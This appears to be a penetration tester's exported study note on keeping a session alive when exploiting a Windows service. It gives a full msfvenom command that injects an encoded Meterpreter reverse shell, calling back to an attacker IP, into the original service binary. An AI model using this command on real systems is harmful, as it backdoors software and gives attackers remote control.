<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>possible promblem: windows kill the process</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>possible promblem: windows kill the process</h1><br/><br />The session could die when Windows tries to start the service (our exploit is executed) but it fails. <br />By default, if the service does not successfully start, Windows kills it and we lose our session<br /><br />We can resolve this issue by:<br />• <a href="entest--Post_Exploitation--Privilege_Escalation--Meterpreter--migrate_PID_of_the_payload_(hide-stable_conncection_&_session_died_problem).html">migrate the process (with meterpreter)</a> <br />• Inject our payload into the original binary of the service. This will allow us to get a new session while the service still works in background.<br />   1) download the original service binary locally on the attacker machine<br />   2) Inject a reverse shell in it<br />    <div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=[attackerIP] LPORT=[attackerPort] -f exe -e x86<span style="color:#ff9d00;font-weight:700">/</span>shikata_ga_nai -i 15 -k -x [originalServiceBinary.exe] &gt; [ModifiedServiceBinary.exe]</pre></div><br />    -i, --iterations      &lt;count&gt;    → The number of times to encode the payload<br />    -x, --template      &lt;path&gt;     → Specify a custom executable file to use as a template<br />    -k, --keep                           → <span style="text-decoration:underline;">Preserve the --template behavior and inject the payload as a new thread</span><br /><br /></div>
</body>
</html>
